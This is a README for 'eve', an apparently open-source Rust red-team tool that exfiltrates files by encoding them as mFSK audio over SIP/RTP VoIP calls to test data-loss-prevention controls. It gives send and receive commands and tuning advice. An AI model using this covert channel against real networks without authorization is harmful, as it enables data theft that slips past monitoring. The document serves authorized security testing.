# eve — Encoded VoIP Exfil

[![CI](https://img.shields.io/github/actions/workflow/status/digital-grease/EVE/ci.yml?branch=main&logo=github&label=CI)](https://github.com/digital-grease/EVE/actions/workflows/ci.yml)
[![Rust](https://img.shields.io/badge/rust-2021_edition-orange?logo=rust)](https://www.rust-lang.org/)
[![GitHub Release](https://img.shields.io/github/v/release/digital-grease/EVE?include_prereleases&logo=github)](https://github.com/digital-grease/EVE/releases)
[![GitHub Issues](https://img.shields.io/github/issues/digital-grease/EVE)](https://github.com/digital-grease/EVE/issues)

`eve` is a red-team / penetration-testing utility that transfers arbitrary files between two endpoints by encoding data as [mFSK](https://en.wikipedia.org/wiki/Frequency-shift_keying) (Multiple Frequency-Shift Keying) audio and streaming it over a SIP/RTP VoIP call. It is designed for authorized engagements to test Data-Loss Prevention (DLP) and network-monitoring controls.

> **Authorization required.** Use only on systems and networks you are authorized to test.

---

## Build

```bash
cargo build --release
# Binary: target/release/eve
```

Requires stable Rust (no nightly features). No external C libraries.

---

## Usage

### Receiver (start first)

```bash
eve recv --output-dir /tmp/received/
```

Listens on UDP port 5060 (SIP) and 10000 (RTP) by default.

### Sender

```bash
eve send --file secret.pdf --dest 192.168.1.42:5060
```

Establishes a SIP call to the receiver, encodes the file as mFSK audio, and streams it as RTP/PCMU packets.

### Loopback test (no network)

```bash
eve loopback --file myfile.bin --tones 16
eve loopback --file myfile.bin --tones 8 --loss-rate 0.01   # simulate 1% sample loss
```

Encodes then decodes locally and prints the bit-error-rate (BER). Use `--save-audio output.wav` to export the PCM stream for inspection in Audacity.

### Persistent receiver

```bash
eve recv --output-dir /tmp/received/ --persist
```

Keeps listening for additional SIP calls after each file is received. Press Ctrl-C to stop.

---

## Options

| Flag | Default | Description |
|------|---------|-------------|
| `--tones` | 16 | Number of mFSK tones: 2, 4, 8, 16, or 32 |
| `--symbol-rate` | 50 | Symbols per second |
| `--base-freq` | 400 | Lowest tone frequency (Hz) |
| `--tone-spacing` | 100 | Spacing between adjacent tones (Hz) |
| `--frame-size` | 128 | Payload bytes per frame |
| `--sip-port` | 5060 | Local SIP UDP port |
| `--rtp-port` | 10000 | Local RTP UDP port |
| `--jitter-ms` | 60 | Dejitter buffer depth (ms) |
| `--arq-retries` | 3 | ARQ retransmission rounds (0 = disabled) |
| `--arq-timeout` | 2000 | Milliseconds sender waits for a NAK before giving up |
| `--start-tone-freq` | 300 | Start signal tone frequency (Hz) |
| `--stop-tone-freq` | 3600 | Stop signal tone frequency (Hz) |
| `--signal-tone-ms` | 200 | Duration of each signal tone (ms) |
| `--verbose` | off | Print per-symbol SNR diagnostics |
| `--save-audio <PATH>` | — | Dump generated PCM to a WAV file |

**Subcommand-specific flags:**

| Flag | Subcommand | Description |
|------|------------|-------------|
| `--persist` | `recv` | Keep listening for additional transfers after each file completes |
| `--loss-rate` | `loopback` | Fraction of samples to randomly drop before decoding (0.0–1.0) |

---

## mFSK Parameter Tuning

### How it works

1. The file is split into frames (default 128 bytes payload each) with CRC-32 verification.
2. Each frame is serialised to bytes and encoded as a sequence of mFSK symbols.
3. Each symbol maps `log2(M)` bits to one of M frequencies between `base-freq` and `base-freq + (M-1) × tone-spacing` Hz.
4. At 8 kHz (G.711 narrowband), all tones must fit below ~3 400 Hz for compatibility with typical VoIP codecs.
5. A synchronisation preamble (chirp sweep low→high then high→low) is prepended for decoder timing lock.

### Throughput vs. reliability trade-offs

| `--tones` | Bits/symbol | Symbol rate | Raw bitrate | ~Effective |
|-----------|-------------|-------------|-------------|------------|
| 2 | 1 | 50 sym/s | 50 bps | ~40 bps |
| 4 | 2 | 50 sym/s | 100 bps | ~80 bps |
| 8 | 3 | 50 sym/s | 150 bps | ~120 bps |
| 16 | 4 | 50 sym/s | 200 bps | ~160 bps |
| 32 | 5 | 50 sym/s | 250 bps | ~200 bps |

**More tones** → higher throughput but narrower tone spacing, more susceptible to G.711 codec noise, jitter, and VoIP transcoding artefacts.

**Higher `--symbol-rate`** → higher throughput but smaller symbol windows → less accurate Goertzel filter detection.

**Recommended starting point for live VoIP calls:** `--tones 8 --symbol-rate 25` for robustness.

### ARQ (Automatic Repeat reQuest)

When `--arq-retries` > 0 (default: 3), the receiver detects missing frames after the initial transfer and sends a NAK (negative acknowledgement) back to the sender as an mFSK burst over the reverse RTP channel. The sender decodes the NAK, re-encodes only the missing frames, and retransmits them. This loop repeats up to `--arq-retries` times.

Disable ARQ with `--arq-retries 0` for a fire-and-forget transfer.

### Bandwidth check

With M=16, tone-spacing=100 Hz, base-freq=400 Hz:
- Highest tone: 400 + 15 × 100 = 1 900 Hz — well within narrowband voice passband.

With M=32, tone-spacing=100 Hz, base-freq=400 Hz:
- Highest tone: 400 + 31 × 100 = 3 500 Hz — marginal; consider reducing spacing to 50 Hz.

---

## Architecture

```
src/
├── main.rs           CLI entry point (clap)
├── config.rs         Shared configuration types
├── pipeline.rs       Async pipeline (framing → codec → VoIP)
├── wav.rs            Minimal WAV writer (no crate)
├── codec/
│   ├── mfsk_encode.rs   Data → mFSK PCM
│   └── mfsk_decode.rs   mFSK PCM → Data (Goertzel + cross-correlation)
├── framing/
│   ├── packetizer.rs    File → Frames (CRC-32, seq numbers)
│   └── depacketizer.rs  Frames → File (reordering, gap detection)
├── voip/
│   ├── sip.rs           Minimal SIP UA (INVITE/200/ACK/BYE)
│   └── rtp.rs           RTP header, G.711 μ-law, dejitter buffer
└── transport/
    └── udp.rs           Async UDP socket wrapper
```

---

## Running Tests

```bash
cargo test                                    # all 68 tests
cargo test --lib                              # 55 unit tests only
cargo test --test integration_test            # 5 codec+framing integration tests
cargo test --test e2e_network_test            # 8 real network E2E tests
cargo clippy --tests                          # lint check
```

### Test layers

| Layer | Count | What it covers |
|-------|-------|----------------|
| Unit tests | 55 | mFSK encode/decode, Goertzel, framing serialize/CRC, SIP message build/parse, RTP headers, G.711 μ-law, dejitter buffer, WAV writer |
| Integration tests | 5 | Full codec+framing round-trip (all M values), multi-frame, empty file, NAK round-trip, ARQ recovery with simulated frame loss |
| E2E network tests | 8 | Real SIP handshake over UDP, real RTP pacing with dejitter, full sender→receiver file transfer (M=4, M=16, multi-frame) over localhost, CLI binary smoke tests with WAV output |

The E2E network tests exercise the complete stack: SIP signaling, RTP packetization at real 20ms pacing intervals, G.711 μ-law codec, mFSK modulation/demodulation, frame reassembly, and SHA-256 file integrity verification — all over real UDP sockets on localhost.
